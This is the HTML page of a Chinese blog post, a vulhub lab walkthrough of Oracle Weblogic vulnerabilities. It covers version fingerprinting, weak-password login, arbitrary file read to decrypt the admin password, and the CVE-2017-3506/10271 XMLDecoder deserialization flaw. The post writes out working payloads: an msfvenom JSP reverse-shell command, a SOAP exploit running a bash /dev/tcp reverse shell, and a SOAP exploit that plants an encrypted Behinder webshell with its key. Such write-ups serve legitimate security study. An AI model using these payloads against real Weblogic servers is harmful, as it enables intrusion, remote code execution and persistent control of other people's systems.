@@ -1,0 +1,285 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Weblogic漏洞复现合集 | 知识茧房</title><meta name="keywords" content="Weblogic"><meta name="author" content="sh@rp"><meta name="copyright" content="sh@rp"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="介绍Weblogic是一个基于JAVAEE架构的中间件，用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。此文根据vulhub靶场环境进行漏洞复现。 框架识别 默认的7001端口号，访问时会显示404状态码  识别版本 比较老的办法是访问控制台登录界面url:7001&#x2F;console&#x2F;login&#x2F;LoginForm.jsp，页面的底部会显示版本号信息。当然该">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Weblogic漏洞复现合集">
+<meta property="og:url" content="https://sharpa.cn/2022/04/26/Weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/index.html">
+<meta property="og:site_name" content="知识茧房">
+<meta property="og:description" content="介绍Weblogic是一个基于JAVAEE架构的中间件，用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。此文根据vulhub靶场环境进行漏洞复现。 框架识别 默认的7001端口号，访问时会显示404状态码  识别版本 比较老的办法是访问控制台登录界面url:7001&#x2F;console&#x2F;login&#x2F;LoginForm.jsp，页面的底部会显示版本号信息。当然该">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg">
+<meta property="article:published_time" content="2022-04-26T01:40:43.000Z">
+<meta property="article:modified_time" content="2022-04-28T08:52:50.035Z">
+<meta property="article:author" content="sh@rp">
+<meta property="article:tag" content="Weblogic">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://sharpa.cn/2022/04/26/Weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?226e8a286317f52a48c8d9e6788c5bfd";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Weblogic漏洞复现合集',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-04-28 16:52:50'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2022/01/23/fGp3IMyUswHugoY.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">45</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">27</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-book"></i><span> 阅读</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 介绍</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">知识茧房</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-book"></i><span> 阅读</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 介绍</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Weblogic漏洞复现合集</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-04-26T01:40:43.000Z" title="发表于 2022-04-26 09:40:43">2022-04-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-04-28T08:52:50.035Z" title="更新于 2022-04-28 16:52:50">2022-04-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic/">Weblogic</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>7分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Weblogic漏洞复现合集"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2022/04/26/Weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2022/04/26/Weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/" itemprop="commentCount"></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>Weblogic是一个基于JAVAEE架构的中间件，用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。<br>此文根据vulhub靶场环境进行漏洞复现。</p>
+<h2 id="框架识别"><a href="#框架识别" class="headerlink" title="框架识别"></a>框架识别</h2><ul>
+<li>默认的<code>7001</code>端口号，访问时会显示404状态码</li>
+</ul>
+<h2 id="识别版本"><a href="#识别版本" class="headerlink" title="识别版本"></a>识别版本</h2><ul>
+<li>比较老的办法是访问控制台登录界面<code>url:7001/console/login/LoginForm.jsp</code>，页面的底部会显示版本号信息。当然该界面可能会被删除或禁止访问。</li>
+<li>另一种方法是抓包，返回的协议报文中会带有Weblogic版本信息。<ul>
+<li>工作原理<br>我们只需要发送<code>t3 10.3.6nAS:255nHL:19nn</code>数据给服务器，服务器会自动返回版本信息。</li>
+<li>注意点<ul>
+<li>如果只返回一个HELLO，这说明t3协议是开启的，需要多次提交探测包，才可能在某一次成功时获取到。</li>
+<li>如果未探测到可能有以下几种请求：<ul>
+<li>t3协议未启用</li>
+<li>服务器做了负载均衡</li>
+</ul>
+</li>
+<li>t3只支持HTTP协议，如果目标是HTTPS协议则需要t3s协议。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="weak-password"><a href="#weak-password" class="headerlink" title="weak password"></a>weak password</h1><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>人为因素未修改系统默认密码，导致可以登录管理后台。另一个是因为存在任意文件读取命令，可以读取Weblogic默认目录下面管理员加密后的密码，以及用来进行加密的密钥。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>各个版本都会影响，大部分以10.3.6.0版本为例。</p>
+<h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><p>进入<code>/console/login/LoginForm.jsp</code>后台登录界面，尝试弱口令登录</p>
+<blockquote>
+<p>用户名：weblogic<br>密码：Oracle@123</p>
+</blockquote>
+<p>登录成功，在右侧的菜单栏中选择部署，然后将包含shell的war包上传后部署在<code>/root/Oracle/Middleware/user_projects/domains/base_domain/autodeploy</code>目录下。<br>上面在上传的同时可以以Web应用的格式进行部署。<br>用msfvenom生成一个反向shell<br><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=ip LPORT=18050 SHELL=/bin/bash -o shell.jsp </code><br><code>jar -cvf shell.war shell.jsp</code>进行打包<br>对反弹的端口进行监听（可以使用msf自带的模块，也可以使用nc），之后访问上传的文件<code>curl http://url/shell/shell.jsp</code>便可以成功反弹shell。</p>
+<h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><p>Weblogic默认错误输入5次密码后锁定账号，所以当弱密码漏洞不存在时，我们可以配合任意文件读取来GetShell。<br>Weblogic密码使用AES对称加密，知道密文和加密时的密钥便可以进行解密。<br>这两样东西均为于<code>base_domain</code>目录下。</p>
+<ul>
+<li><code>security/SerializedSystemIni.dat</code>存储密钥</li>
+<li><code>config/config.xml</code>存储加密后的管理员密码，因为该文件是<code>base_domain</code>的全局配置文件，所以信息可能很多。我们需要的是<code>&lt;node-manager-password-encrypted&gt;</code>字段的值。</li>
+</ul>
+<p>在<code>hello/file.jsp/path=/etc/passwd</code>下存在任意文件包含漏洞，我们接下来读取上面的两个文件。<br>存储密钥的文件内容是二进制形式，我们使用curl读取后保存到key文件内。<br><code>curl http://ip:port/hello/file.jsp?path=security/SerializedSystemIni.dat &gt; key</code><br><code>curl http://ip:port/hello/file.jsp?path=config/config.xml &gt; config </code>读取配置文件，并找到加密后的密码。<br>之后对密码进行解密，结果为<code>Oracle@123</code>，与之前登录时的弱密码一样。<br>解密工具<a target="_blank" rel="noopener" href="https://github.com/yuxiaoyou123/weblogic-Decryptor">地址</a>。</p>
+<div class="note info red flat"><p>该工具在kali运行可能会缺少依赖的jar包，windows运行没有问题</p>
+</div>
+<p><code>&lt;node-manager-username&gt;</code>标签保存着用户名，接下来使用weblogic用户名和破解的密码登录即可。</p>
+<h1 id="XMLDecoder反序列化漏洞（CVE-2017-3506）"><a href="#XMLDecoder反序列化漏洞（CVE-2017-3506）" class="headerlink" title="XMLDecoder反序列化漏洞（CVE-2017-3506）"></a>XMLDecoder反序列化漏洞（CVE-2017-3506）</h1><h2 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>Weblogic Server WLS 组件在调用XMLDecoder进行解析XML数据时，触发反序列化漏洞进而造成远程命令执行，并且没有对输入的数据进行任何的过滤。<br>漏洞的触发点：wls-wsat.war这个Web应用下</p>
+<p>该组件包括的路径：</p>
+<blockquote>
+<p>/wls-wsat/CoordinatorPortType<br>/wls-wsat/RegistrationPortTypeRPC<br>/wls-wsat/ParticipantPortType<br>/wls-wsat/RegistrationRequesterPortType<br>/wls-wsat/CoordinatorPortType11<br>/wls-wsat/RegistrationPortTypeRPC11<br>/wls-wsat/ParticipantPortType11<br>/wls-wsat/RegistrationRequesterPortType11<br>上面的路径都可以用来上传XML恶意数据。</p>
+</blockquote>
+<h2 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h2><p>Weblogic 10.3.6.0, 12.1.3.0, 12.2.1.0, 12.2.1.1 和 12.2.1.2。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>利用方式：通过构造SOAP(XML)格式的请求，在POST请求体中提交恶意XML数据，造成解析过程中XMLDecoder的反序列化漏洞。</p>
+<p>这些目录定义在<code>web.xml</code>配置文件中，Windows下该文件的路径：<code>C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\wls-wsat\54p17w\war\WEB-INF</code><br>Linux在home目录下开始<br>我们在XML中设置将shell上传到<code>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/</code>或<code>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/</code><br>这两个路径根据Weblogic版本的不同而变化，可以同时存在。<br>EXP</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span><br><span class="line">&lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java&gt;</span><br><span class="line">&lt;object class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;</span><br><span class="line">&lt;/object&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>
+<p>上面反弹部分代码中的特殊字符必须要进行编码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span><br><span class="line">&lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;object class=&quot;java.io.PrintWriter&quot;&gt; </span><br><span class="line">&lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/wtf.jsp&lt;/string&gt;</span><br><span class="line">&lt;void method=&quot;println&quot;&gt;</span><br><span class="line">&lt;string&gt;</span><br><span class="line">&lt;![CDATA[</span><br><span class="line">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;</span><br><span class="line">]]&gt;</span><br><span class="line">&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void method=&quot;close&quot;/&gt;</span><br><span class="line">&lt;/object&gt;&lt;/java&gt;&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>
+<p>我们使用对通话进行加密的冰蝎马来进行利用。<br>上面的key为<code>e45e329feb5d925b</code>，url路径为<code>/wls-wsat/wtf.jsp</code>或者<code>/bea_wls_internal/wtf.jsp</code>，默认密码为<code>rebeyond</code>。密钥是根据密码的md5值计算出来的。<br><img src="https://s2.loli.net/2022/04/28/pxZSKdRzHrt5L1k.png" alt="image.png"><br><img src="https://s2.loli.net/2022/04/28/YWESehb1xD8IPaT.png" alt="image.png"><br>可以发现上面的两个路径均可以上传，对应的访问路径不同。</p>
+<h2 id="漏洞后续"><a href="#漏洞后续" class="headerlink" title="漏洞后续"></a>漏洞后续</h2><p>对于这个漏洞官方的解决办法仅仅是过滤了<code>object</code>标签，但是我们可以使用其它的标签来代替，比如array或者void等标签。<br>这也正是<code>CVE-2017-10271</code>漏洞的产生原因，上面的exp同样适用于<code>CVE-2017-10271</code>。<br>对于<code>CVE-2017-10271</code>，官方这次将所有的特殊标签均过滤掉了，暂时还没有安全问题。</p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a target="_blank" rel="noopener" href="https://www.xiaohongyan.cn/articles/2021/07/12/1626073473011.html#toc_h3_44">https://www.xiaohongyan.cn/articles/2021/07/12/1626073473011.html#toc_h3_44</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/278228.html">https://www.freebuf.com/vuls/278228.html</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/243985.html">https://www.freebuf.com/vuls/243985.html</a><br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1861375">https://cloud.tencent.com/developer/article/1861375</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">sh@rp</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://sharpa.cn/2022/04/26/Weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/">https://sharpa.cn/2022/04/26/Weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://sharpa.cn" target="_blank">知识茧房</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Weblogic/">Weblogic</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" data-sites="twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/04/25/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%AE%9E%E9%AA%8C%E5%AE%A4GIT%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/"><img class="next-cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">gitServer使用说明</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A1%86%E6%9E%B6%E8%AF%86%E5%88%AB"><span class="toc-number">1.1.</span> <span class="toc-text">框架识别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%86%E5%88%AB%E7%89%88%E6%9C%AC"><span class="toc-number">1.2.</span> <span class="toc-text">识别版本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#weak-password"><span class="toc-number">2.</span> <span class="toc-text">weak password</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">2.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">2.2.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">2.3.</span> <span class="toc-text">弱口令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">2.4.</span> <span class="toc-text">任意文件读取</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3506%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">XMLDecoder反序列化漏洞（CVE-2017-3506）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-1"><span class="toc-number">3.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-1"><span class="toc-number">3.2.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.3.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%90%8E%E7%BB%AD"><span class="toc-number">3.4.</span> <span class="toc-text">漏洞后续</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" 